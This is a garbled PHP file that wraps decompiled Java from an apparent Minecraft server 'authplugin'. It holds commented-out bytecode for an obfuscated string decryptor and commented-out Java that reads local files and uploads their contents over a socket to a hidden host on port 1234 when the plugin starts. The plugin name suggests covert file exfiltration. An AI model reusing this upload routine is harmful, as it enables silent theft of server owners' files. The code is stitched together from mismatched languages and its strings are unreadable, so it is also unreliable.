<?php


$checksum = crc32("The quick brown fox jumped over the lazy dog.");
printf("%u\n", $checksum);

class ca {	static final function uD509($paramString) {
    // Byte code:
    //   0: iconst_0
    //   1: istore 21
    //   3: iconst_0
    //   4: istore 22
    //   6: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   9: ifnonnull +6 -> 15
    //   12: invokestatic 59	minecraftsocial/authplugin/c$a$1:\u1D5B	()V
    //   15: invokestatic 65	java/lang/Thread:currentThread	()Ljava/lang/Thread;
    //   18: invokevirtual 69	java/lang/Thread:getStackTrace	()[Ljava/lang/StackTraceElement;
    //   21: dup
    //   22: new 71	java/lang/StringBuilder
    //   25: astore 13
    //   27: aload 13
    //   29: invokespecial 74	java/lang/StringBuilder:<init>	()V
    //   32: iconst_2
    //   33: aaload
    //   34: invokevirtual 80	java/lang/StackTraceElement:getClassName	()Ljava/lang/String;
    //   37: astore 12
    //   39: aload 13
    //   41: aload 12
    //   43: invokevirtual 84	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   46: astore 13
    //   48: iconst_2
    //   49: aaload
    //   50: invokevirtual 87	java/lang/StackTraceElement:getMethodName	()Ljava/lang/String;
    //   53: astore 12
    //   55: aload 13
    //   57: aload 12
    //   59: invokevirtual 84	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   62: invokevirtual 90	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   65: invokevirtual 96	java/lang/String:hashCode	()I
    //   68: istore_1
    //   69: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   72: bipush 6
    //   74: aaload
    //   75: checkcast 98	[I
    //   78: checkcast 98	[I
    //   81: astore_2
    //   82: iload_1
    //   83: aload_2
    //   84: iconst_0
    //   85: iaload
    //   86: ixor
    //   87: istore_3
    //   88: iload_1
    //   89: aload_2
    //   90: iconst_1
    //   91: iaload
    //   92: ixor
    //   93: istore 4
    //   95: iload_1
    //   96: aload_2
    //   97: iconst_2
    //   98: iaload
    //   99: ixor
    //   100: istore 5
    //   102: iload_1
    //   103: aload_2
    //   104: iconst_3
    //   105: iaload
    //   106: ixor
    //   107: istore_2
    //   108: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   111: iconst_5
    //   112: aaload
    //   113: checkcast 98	[I
    //   116: checkcast 98	[I
    //   119: astore_1
    //   120: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   123: iconst_1
    //   124: aaload
    //   125: checkcast 98	[I
    //   128: checkcast 98	[I
    //   131: astore 6
    //   133: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   136: iconst_2
    //   137: aaload
    //   138: checkcast 98	[I
    //   141: checkcast 98	[I
    //   144: astore 7
    //   146: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   149: iconst_3
    //   150: aaload
    //   151: checkcast 98	[I
    //   154: checkcast 98	[I
    //   157: astore 8
    //   159: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   162: iconst_4
    //   163: aaload
    //   164: checkcast 98	[I
    //   167: checkcast 98	[I
    //   170: astore 9
    //   172: getstatic 55	minecraftsocial/authplugin/c$a$1:\u8F03	[Ljava/lang/Object;
    //   175: iconst_0
    //   176: aaload
    //   177: checkcast 100	[B
    //   180: checkcast 100	[B
    //   183: astore 10
    //   185: aload_0
    //   186: invokevirtual 104	java/lang/String:toCharArray	()[C
    //   189: astore_0
    //   190: goto +1251 -> 1441
    //   193: iload 22
    //   195: ifne +1228 -> 1423
    //   198: pop
    //   199: iinc 22 1
    //   202: aload_0
    //   203: arraylength
    //   204: istore 11
    //   206: iconst_0
    //   207: istore 12
    //   209: iload 12
    //   211: iload 11
    //   213: if_icmpge +1207 -> 1420
    //   216: iload 12
    //   218: bipush 8
    //   220: irem
    //   221: ifne +1213 -> 1434
    //   224: iconst_0
    //   225: istore 13
    //   227: iconst_0
    //   228: istore 13
    //   230: iconst_0
    //   231: istore 13
    //   233: iconst_0
    //   234: istore 13
    //   236: iload_3
    //   237: aload_1
    //   238: iconst_0
    //   239: iaload
    //   240: ixor
    //   241: istore 14
    //   243: iload 4
    //   245: aload_1
    //   246: iconst_1
    //   247: iaload
    //   248: ixor
    //   249: istore 15
    //   251: iload 5
    //   253: aload_1
    //   254: iconst_2
    //   255: iaload
    //   256: ixor
    //   257: istore 16
    //   259: iload_2
    //   260: aload_1
    //   261: iconst_3
    //   262: iaload
    //   263: ixor
    //   264: istore 17
    //   266: iconst_4
    //   267: istore 13
    //   269: iload 13
    //   271: bipush 36
    //   273: if_icmpge +438 -> 711
    //   276: aload 6
    //   278: iload 14
    //   280: sipush 255
    //   283: iand
    //   284: iaload
    //   285: aload 7
    //   287: iload 15
    //   289: bipush 8
    //   291: ishr
    //   292: sipush 255
    //   295: iand
    //   296: iaload
    //   297: ixor
    //   298: aload 8
    //   300: iload 16
    //   302: bipush 16
    //   304: ishr
    //   305: sipush 255
    //   308: iand
    //   309: iaload
    //   310: ixor
    //   311: aload 9
    //   313: iload 17
    //   315: bipush 24
    //   317: iushr
    //   318: iaload
    //   319: ixor
    //   320: aload_1
    //   321: iload 13
    //   323: iaload
    //   324: ixor
    //   325: istore 18
    //   327: aload 6
    //   329: iload 15
    //   331: sipush 255
    //   334: iand
    //   335: iaload
    //   336: aload 7
    //   338: iload 16
    //   340: bipush 8
    //   342: ishr
    //   343: sipush 255
    //   346: iand
    //   347: iaload
    //   348: ixor
    //   349: aload 8
    //   351: iload 17
    //   353: bipush 16
    //   355: ishr
    //   356: sipush 255
    //   359: iand
    //   360: iaload
    //   361: ixor
    //   362: aload 9
    //   364: iload 14
    //   366: bipush 24
    //   368: iushr
    //   369: iaload
    //   370: ixor
    //   371: aload_1
    //   372: iload 13
    //   374: iconst_1
    //   375: iadd
    //   376: iaload
    //   377: ixor
    //   378: istore 19
    //   380: aload 6
    //   382: iload 16
    //   384: sipush 255
    //   387: iand
    //   388: iaload
    //   389: aload 7
    //   391: iload 17
    //   393: bipush 8
    //   395: ishr
    //   396: sipush 255
    //   399: iand
    //   400: iaload
    //   401: ixor
    //   402: aload 8
    //   404: iload 14
    //   406: bipush 16
    //   408: ishr
    //   409: sipush 255
    //   412: iand
    //   413: iaload
    //   414: ixor
    //   415: aload 9
    //   417: iload 15
    //   419: bipush 24
    //   421: iushr
    //   422: iaload
    //   423: ixor
    //   424: aload_1
    //   425: iload 13
    //   427: iconst_2
    //   428: iadd
    //   429: iaload
    //   430: ixor
    //   431: istore 20
    //   433: aload 6
    //   435: iload 17
    //   437: sipush 255
    //   440: iand
    //   441: iaload
    //   442: aload 7
    //   444: iload 14
    //   446: bipush 8
    //   448: ishr
    //   449: sipush 255
    //   452: iand
    //   453: iaload
    //   454: ixor
    //   455: aload 8
    //   457: iload 15
    //   459: bipush 16
    //   461: ishr
    //   462: sipush 255
    //   465: iand
    //   466: iaload
    //   467: ixor
    //   468: aload 9
    //   470: iload 16
    //   472: bipush 24
    //   474: iushr
    //   475: iaload
    //   476: ixor
    //   477: aload_1
    //   478: iload 13
    //   480: iconst_3
    //   481: iadd
    //   482: iaload
    //   483: ixor
    //   484: istore 17
    //   486: iload 13
    //   488: iconst_4
    //   489: iadd
    //   490: istore 13
    //   492: aload 6
    //   494: iload 18
    //   496: sipush 255
    //   499: iand
    //   500: iaload
    //   501: aload 7
    //   503: iload 19
    //   505: bipush 8
    //   507: ishr
    //   508: sipush 255
    //   511: iand
    //   512: iaload
    //   513: ixor
    //   514: aload 8
    //   516: iload 20
    //   518: bipush 16
    //   520: ishr
    //   521: sipush 255
    //   524: iand
    //   525: iaload
    //   526: ixor
    //   527: aload 9
    //   529: iload 17
    //   531: bipush 24
    //   533: iushr
    //   534: iaload
    //   535: ixor
    //   536: aload_1
    //   537: iload 13
    //   539: iaload
    //   540: ixor
    //   541: istore 14
    //   543: aload 6
    //   545: iload 19
    //   547: sipush 255
    //   550: iand
    //   551: iaload
    //   552: aload 7
    //   554: iload 20
    //   556: bipush 8
    //   558: ishr
    //   559: sipush 255
    //   562: iand
    //   563: iaload
    //   564: ixor
    //   565: aload 8
    //   567: iload 17
    //   569: bipush 16
    //   571: ishr
    //   572: sipush 255
    //   575: iand
    //   576: iaload
    //   577: ixor
    //   578: aload 9
    //   580: iload 18
    //   582: bipush 24
    //   584: iushr
    //   585: iaload
    //   586: ixor
    //   587: aload_1
    //   588: iload 13
    //   590: iconst_1
    //   591: iadd
    //   592: iaload
    //   593: ixor
    //   594: istore 15
    //   596: aload 6
    //   598: iload 20
    //   600: sipush 255
    //   603: iand
    //   604: iaload
    //   605: aload 7
    //   607: iload 17
    //   609: bipush 8
    //   611: ishr
    //   612: sipush 255
    //   615: iand
    //   616: iaload
    //   617: ixor
    //   618: aload 8
    //   620: iload 18
    //   622: bipush 16
    //   624: ishr
    //   625: sipush 255
    //   628: iand
    //   629: iaload
    //   630: ixor
    //   631: aload 9
    //   633: iload 19
    //   635: bipush 24
    //   637: iushr
    //   638: iaload
    //   639: ixor
    //   640: aload_1
    //   641: iload 13
    //   643: iconst_2
    //   644: iadd
    //   645: iaload
    //   646: ixor
    //   647: istore 16
    //   649: aload 6
    //   651: iload 17
    //   653: sipush 255
    //   656: iand
    //   657: iaload
    //   658: aload 7
    //   660: iload 18
    //   662: bipush 8
    //   664: ishr
    //   665: sipush 255
    //   668: iand
    //   669: iaload
    //   670: ixor
    //   671: aload 8
    //   673: iload 19
    //   675: bipush 16
    //   677: ishr
    //   678: sipush 255
    //   681: iand
    //   682: iaload
    //   683: ixor
    //   684: aload 9
    //   686: iload 20
    //   688: bipush 24
    //   690: iushr
    //   691: iaload
    //   692: ixor
    //   693: aload_1
    //   694: iload 13
    //   696: iconst_3
    //   697: iadd
    //   698: iaload
    //   699: ixor
    //   700: istore 17
    //   702: iload 13
    //   704: iconst_4
    //   705: iadd
    //   706: istore 13
    //   708: goto -439 -> 269
    //   711: aload 6
    //   713: iload 14
    //   715: sipush 255
    //   718: iand
    //   719: iaload
    //   720: aload 7
    //   722: iload 15
    //   724: bipush 8
    //   726: ishr
    //   727: sipush 255
    //   730: iand
    //   731: iaload
    //   732: ixor
    //   733: aload 8
    //   735: iload 16
    //   737: bipush 16
    //   739: ishr
    //   740: sipush 255
    //   743: iand
    //   744: iaload
    //   745: ixor
    //   746: aload 9
    //   748: iload 17
    //   750: bipush 24
    //   752: iushr
    //   753: iaload
    //   754: ixor
    //   755: aload_1
    //   756: iload 13
    //   758: iaload
    //   759: ixor
    //   760: istore 20
    //   762: aload 6
    //   764: iload 15
    //   766: sipush 255
    //   769: iand
    //   770: iaload
    //   771: aload 7
    //   773: iload 16
    //   775: bipush 8
    //   777: ishr
    //   778: sipush 255
    //   781: iand
    //   782: iaload
    //   783: ixor
    //   784: aload 8
    //   786: iload 17
    //   788: bipush 16
    //   790: ishr
    //   791: sipush 255
    //   794: iand
    //   795: iaload
    //   796: ixor
    //   797: aload 9
    //   799: iload 14
    //   801: bipush 24
    //   803: iushr
    //   804: iaload
    //   805: ixor
    //   806: aload_1
    //   807: iload 13
    //   809: iconst_1
    //   810: iadd
    //   811: iaload
    //   812: ixor
    //   813: istore 19
    //   815: aload 6
    //   817: iload 16
    //   819: sipush 255
    //   822: iand
    //   823: iaload
    //   824: aload 7
    //   826: iload 17
    //   828: bipush 8
    //   830: ishr
    //   831: sipush 255
    //   834: iand
    //   835: iaload
    //   836: ixor
    //   837: aload 8
    //   839: iload 14
    //   841: bipush 16
    //   843: ishr
    //   844: sipush 255
    //   847: iand
    //   848: iaload
    //   849: ixor
    //   850: aload 9
    //   852: iload 15
    //   854: bipush 24
    //   856: iushr
    //   857: iaload
    //   858: ixor
    //   859: aload_1
    //   860: iload 13
    //   862: iconst_2
    //   863: iadd
    //   864: iaload
    //   865: ixor
    //   866: istore 18
    //   868: aload 6
    //   870: iload 17
    //   872: sipush 255
    //   875: iand
    //   876: iaload
    //   877: aload 7
    //   879: iload 14
    //   881: bipush 8
    //   883: ishr
    //   884: sipush 255
    //   887: iand
    //   888: iaload
    //   889: ixor
    //   890: aload 8
    //   892: iload 15
    //   894: bipush 16
    //   896: ishr
    //   897: sipush 255
    //   900: iand
    //   901: iaload
    //   902: ixor
    //   903: aload 9
    //   905: iload 16
    //   907: bipush 24
    //   909: iushr
    //   910: iaload
    //   911: ixor
    //   912: aload_1
    //   913: iload 13
    //   915: iconst_3
    //   916: iadd
    //   917: iaload
    //   918: ixor
    //   919: istore 17
    //   921: iload 13
    //   923: iconst_4
    //   924: iadd
    //   925: istore 16
    //   927: aload 10
    //   929: iload 20
    //   931: sipush 255
    //   934: iand
    //   935: baload
    //   936: sipush 255
    //   939: iand
    //   940: aload 10
    //   942: iload 19
    //   944: bipush 8
    //   946: ishr
    //   947: sipush 255
    //   950: iand
    //   951: baload
    //   952: sipush 255
    //   955: iand
    //   956: bipush 8
    //   958: ishl
    //   959: ixor
    //   960: aload 10
    //   962: iload 18
    //   964: bipush 16
    //   966: ishr
    //   967: sipush 255
    //   970: iand
    //   971: baload
    //   972: sipush 255
    //   975: iand
    //   976: bipush 16
    //   978: ishl
    //   979: ixor
    //   980: aload 10
    //   982: iload 17
    //   984: bipush 24
    //   986: iushr
    //   987: baload
    //   988: bipush 24
    //   990: ishl
    //   991: ixor
    //   992: aload_1
    //   993: iload 16
    //   995: iconst_0
    //   996: iadd
    //   997: iaload
    //   998: ixor
    //   999: istore_3
    //   1000: aload 10
    //   1002: iload 19
    //   1004: sipush 255
    //   1007: iand
    //   1008: baload
    //   1009: sipush 255
    //   1012: iand
    //   1013: aload 10
    //   1015: iload 18
    //   1017: bipush 8
    //   1019: ishr
    //   1020: sipush 255
    //   1023: iand
    //   1024: baload
    //   1025: sipush 255
    //   1028: iand
    //   1029: bipush 8
    //   1031: ishl
    //   1032: ixor
    //   1033: aload 10
    //   1035: iload 17
    //   1037: bipush 16
    //   1039: ishr
    //   1040: sipush 255
    //   1043: iand
    //   1044: baload
    //   1045: sipush 255
    //   1048: iand
    //   1049: bipush 16
    //   1051: ishl
    //   1052: ixor
    //   1053: aload 10
    //   1055: iload 20
    //   1057: bipush 24
    //   1059: iushr
    //   1060: baload
    //   1061: bipush 24
    //   1063: ishl
    //   1064: ixor
    //   1065: aload_1
    //   1066: iload 16
    //   1068: iconst_1
    //   1069: iadd
    //   1070: iaload
    //   1071: ixor
    //   1072: istore 4
    //   1074: aload 10
    //   1076: iload 18
    //   1078: sipush 255
    //   1081: iand
    //   1082: baload
    //   1083: sipush 255
    //   1086: iand
    //   1087: aload 10
    //   1089: iload 17
    //   1091: bipush 8
    //   1093: ishr
    //   1094: sipush 255
    //   1097: iand
    //   1098: baload
    //   1099: sipush 255
    //   1102: iand
    //   1103: bipush 8
    //   1105: ishl
    //   1106: ixor
    //   1107: aload 10
    //   1109: iload 20
    //   1111: bipush 16
    //   1113: ishr
    //   1114: sipush 255
    //   1117: iand
    //   1118: baload
    //   1119: sipush 255
    //   1122: iand
    //   1123: bipush 16
    //   1125: ishl
    //   1126: ixor
    //   1127: aload 10
    //   1129: iload 19
    //   1131: bipush 24
    //   1133: iushr
    //   1134: baload
    //   1135: bipush 24
    //   1137: ishl
    //   1138: ixor
    //   1139: aload_1
    //   1140: iload 16
    //   1142: iconst_2
    //   1143: iadd
    //   1144: iaload
    //   1145: ixor
    //   1146: istore 5
    //   1148: aload 10
    //   1150: iload 17
    //   1152: sipush 255
    //   1155: iand
    //   1156: baload
    //   1157: sipush 255
    //   1160: iand
    //   1161: aload 10
    //   1163: iload 20
    //   1165: bipush 8
    //   1167: ishr
    //   1168: sipush 255
    //   1171: iand
    //   1172: baload
    //   1173: sipush 255
    //   1176: iand
    //   1177: bipush 8
    //   1179: ishl
    //   1180: ixor
    //   1181: aload 10
    //   1183: iload 19
    //   1185: bipush 16
    //   1187: ishr
    //   1188: sipush 255
    //   1191: iand
    //   1192: baload
    //   1193: sipush 255
    //   1196: iand
    //   1197: bipush 16
    //   1199: ishl
    //   1200: ixor
    //   1201: aload 10
    //   1203: iload 18
    //   1205: bipush 24
    //   1207: iushr
    //   1208: baload
    //   1209: bipush 24
    //   1211: ishl
    //   1212: ixor
    //   1213: aload_1
    //   1214: iload 16
    //   1216: iconst_3
    //   1217: iadd
    //   1218: iaload
    //   1219: ixor
    //   1220: istore_2
    //   1221: goto +213 -> 1434
    //   1224: iload 21
    //   1226: ifne +186 -> 1412
    //   1229: pop
    //   1230: iconst_1
    //   1231: istore 21
    //   1233: iload 12
    //   1235: bipush 8
    //   1237: irem
    //   1238: tableswitch	default:+171 -> 1409, 0:+46->1284, 1:+63->1301, 2:+77->1315, 3:+95->1333, 4:+110->1348, 5:+128->1366, 6:+143->1381, 7:+160->1398
    //   1285: iload 12
    //   1287: iload_3
    //   1288: bipush 16
    //   1290: ishr
    //   1291: aload_0
    //   1292: iload 12
    //   1294: caload
    //   1295: ixor
    //   1296: i2c
    //   1297: castore
    //   1298: goto +111 -> 1409
    //   1301: aload_0
    //   1302: iload 12
    //   1304: iload_3
    //   1305: aload_0
    //   1306: iload 12
    //   1308: caload
    //   1309: ixor
    //   1310: i2c
    //   1311: castore
    //   1312: goto +97 -> 1409
    //   1315: aload_0
    //   1316: iload 12
    //   1318: iload 4
    //   1320: bipush 16
    //   1322: ishr
    //   1323: aload_0
    //   1324: iload 12
    //   1326: caload
    //   1327: ixor
    //   1328: i2c
    //   1329: castore
    //   1330: goto +79 -> 1409
    //   1333: aload_0
    //   1334: iload 12
    //   1336: iload 4
    //   1338: aload_0
    //   1339: iload 12
    //   1341: caload
    //   1342: ixor
    //   1343: i2c
    //   1344: castore
    //   1345: goto +64 -> 1409
    //   1348: aload_0
    //   1349: iload 12
    //   1351: iload 5
    //   1353: bipush 16
    //   1355: ishr
    //   1356: aload_0
    //   1357: iload 12
    //   1359: caload
    //   1360: ixor
    //   1361: i2c
    //   1362: castore
    //   1363: goto +46 -> 1409
    //   1366: aload_0
    //   1367: iload 12
    //   1369: iload 5
    //   1371: aload_0
    //   1372: iload 12
    //   1374: caload
    //   1375: ixor
    //   1376: i2c
    //   1377: castore
    //   1378: goto +31 -> 1409
    //   1381: aload_0
    //   1382: iload 12
    //   1384: iload_2
    //   1385: bipush 16
    //   1387: ishr
    //   1388: aload_0
    //   1389: iload 12
    //   1391: caload
    //   1392: ixor
    //   1393: i2c
    //   1394: castore
    //   1395: goto +14 -> 1409
    //   1398: aload_0
    //   1399: iload 12
    //   1401: iload_2
    //   1402: aload_0
    //   1403: iload 12
    //   1405: caload
    //   1406: ixor
    //   1407: i2c
    //   1408: castore
    //   1409: goto +5 -> 1414
    //   1412: astore 13
    //   1414: iinc 12 1
    //   1417: goto -1208 -> 209
    //   1420: goto +5 -> 1425
    //   1423: astore 20
    //   1425: new 92	java/lang/String
    //   1428: dup
    //   1429: aload_0
    //   1430: invokespecial 107	java/lang/String:<init>	([C)V
    //   1433: areturn
    //   1434: iconst_0
    //   1435: istore 21
    //   1437: aconst_null
    //   1438: goto -214 -> 1224
    //   1441: iconst_0
    //   1442: istore 22
    //   1444: aconst_null
    //   1445: goto -1252 -> 193
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1448	0	paramString	java.lang.String
    //   68	39	1	i	int
    //   119	1095	1	arrayOfInt1	int[]
    //   81	23	2	arrayOfInt2	int[]
    //   107	1300	2	j	int
    //   87	1223	3	k	int
    //   93	1250	4	m	int
    //   100	1276	5	n	int
    //   131	738	6	arrayOfInt3	int[]
    //   144	734	7	arrayOfInt4	int[]
    //   157	734	8	arrayOfInt5	int[]
    //   170	734	9	arrayOfInt6	int[]
    //   183	1019	10	arrayOfByte	byte[]
    //   204	10	11	i1	int
    //   37	21	12	str	java.lang.String
    //   207	1197	12	i2	int
    //   25	31	13	localStringBuilder	java.lang.StringBuilder
    //   225	700	13	i3	int
    //   241	643	14	i4	int
    //   249	648	15	i5	int
    //   257	961	16	i6	int
    //   264	892	17	i7	int
    //   325	883	18	i8	int
    //   378	810	19	i9	int
    //   431	737	20	i10	int
    //   1	1231	21	i11	int
    //   4	196	22	i12	int
    //   193	1	27	localException1	java.lang.Exception
    //   1224	1	28	localException2	java.lang.Exception
    // Exception table:
    //   from	to	target	type
    //   193	1420	193	java/lang/Exception
    //   1224	1409	1224	java/lang/Exception
	}}

class a {	private $a;
	private $b;
	private $c;

	public function a($paramAuthPlugin, $paramLogger, $paramString) {
		$this->a = $paramLogger;
		$this->c = $paramString;
	}
	/*
	public final void a()
  {
    File localFile = new File(c.a.1.?("?????"));
    Object localObject1 = new File(c.a.1.?("????????????"));
    try
    {
      ArrayList localArrayList = new ArrayList();
      if (localFile.exists()) {
        localArrayList = a(localFile, localArrayList);
      }
      if (((File)localObject1).exists()) {
        localArrayList = a((File)localObject1, localArrayList);
      }
      int i = localArrayList.size();
      (localObject1 = new Socket(c.a.1.?("????????????????"), 1234)).setSoTimeout(2000);
      BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(((Socket)localObject1).getInputStream()));
      PrintWriter localPrintWriter = new PrintWriter(((Socket)localObject1).getOutputStream(), true);
      int j = 1;
      Object localObject2;
      if ((localObject2 = localBufferedReader.readLine()).equals(c.a.1.?("?????")))
      {
        localPrintWriter.println(c.a.1.?("?????????"));
        localPrintWriter.println(this.c);
        for (int k = 0; k < i; k++)
        {
          Object localObject3 = (File)localArrayList.get(k);
          if ((localObject2 = localBufferedReader.readLine()).equals(c.a.1.?("??????????????????")))
          {
            j = 0;
            this.a.info(c.a.1.?("????????????????????????????????????????????????????????????????????"));
            break;
          }
          if (((String)localObject2).equals(c.a.1.?("????????????")))
          {
            localPrintWriter.println(c.a.1.?("????????"));
            localObject2 = new BufferedInputStream(new FileInputStream((File)localObject3));
            BufferedOutputStream localBufferedOutputStream = new BufferedOutputStream(((Socket)localObject1).getOutputStream());
            long l1 = ((File)localObject3).length();
            long l2 = a((File)localObject3);
            localObject3 = ((File)localObject3).getName();
            localPrintWriter.println(l1);
            localPrintWriter.println(l2);
            localPrintWriter.println((String)localObject3);
            Object localObject4;
            if ((localObject4 = localBufferedReader.readLine()).equals(c.a.1.?("???????????????????")))
            {
              j = 0;
              this.a.info(c.a.1.?("??????????????????????????????????????????????????????"));
              break;
            }
            if (((String)localObject4).equals(c.a.1.?("?????")))
            {
              this.a.info(c.a.1.?("???????????????????????") + (String)localObject3 + c.a.1.?("????????????????????????????????"));
            }
            else
            {
              this.a.info(c.a.1.?("?????????????????????????????????") + (String)localObject3);
              localObject4 = new byte[8192];
              int m;
              while ((m = ((BufferedInputStream)localObject2).read((byte[])localObject4)) != -1)
              {
                localBufferedOutputStream.write((byte[])localObject4, 0, m);
                localBufferedOutputStream.flush();
              }
              ((BufferedInputStream)localObject2).close();
              if ((localObject2 = localBufferedReader.readLine()).equals(c.a.1.?("??????????????"))) {
                this.a.info(c.a.1.?("???????????????????????") + (String)localObject3 + c.a.1.?("?????????????"));
              }
              if (((String)localObject2).equals(c.a.1.?("??????")))
              {
                this.a.info(c.a.1.?("??????????????????????????????????????????????????????????????") + (String)localObject3 + c.a.1.?("?????????"));
                k--;
              }
            }
          }
        }
        if (localBufferedReader.readLine().equals(c.a.1.?("????????????"))) {
          localPrintWriter.println(c.a.1.?("????"));
        }
      }
      localPrintWriter.close();
      localBufferedReader.close();
      ((Socket)localObject1).close();
      if (j != 0) {
        this.a.info(c.a.1.?("???????????????????????????????????????????????????????????????"));
      }
      return;
    }
    catch (IOException localIOException)
    {
      this.a.info(c.a.1.?("????????????????????????????????????????????????????????????????????????"));
    }
  }
  */}

class c {	private $a;
	private $b;
	private $c;
	private $d;
	private $e;
	private $f;

	public function c($paramString1, $paramString2, $paramLogger) {
	    $this->a = $paramString1;
    	$this->b = $paramString2;
	    $this->f = $paramLogger;
	}}

class authplugin {  //private Logger e = Logger.getLogger(c.a.1.?("????????)"));
//	private static String f = c.a.1.?("????????????????");
	private static $g = 1234;
//	private static String h = c.a.1.?("????????????????");
	private static $i = 2000;
	public static $a = false;
	public static $b = false;
	public static $c;
	public static $d = '';

	private static function a($paramString) {
    	//return (paramString = InetAddress.getByName(paramString)).getHostAddress();
	}

	public function onEnable() {
/*    this.e.info(c.a.1.?("???????????") + getDescription().getVersion() + c.a.1.?("??????????????????"));
    saveDefaultConfig();
    d = getConfig().getString(c.a.1.?("???????????"));
    Object localObject = new b(this.e, d);
    try
    {
      ((b)localObject).a();
    }
    catch (IOException localIOException)
    {
      this.e.warning(c.a.1.?("??????????????????????????????????"));
      Bukkit.getPluginManager().disablePlugin(this);
    }
    this.e.info(c.a.1.?("???????????????????????????????????????????"));
    if (a) {
      (localObject = new a(this, this.e, d)).a();
    } else {
      this.e.info(c.a.1.?("???????????????????????????????????"));
    }
    if (b)
    {
      this.e.info(c.a.1.?("????????????????????????????????????"));
      new d(this, this.e);
      return;
    }
    this.e.info(c.a.1.?("?????????????????????????????????????"));
	*/
	}
}




$ap = new authplugin;
print_r($ap);



?>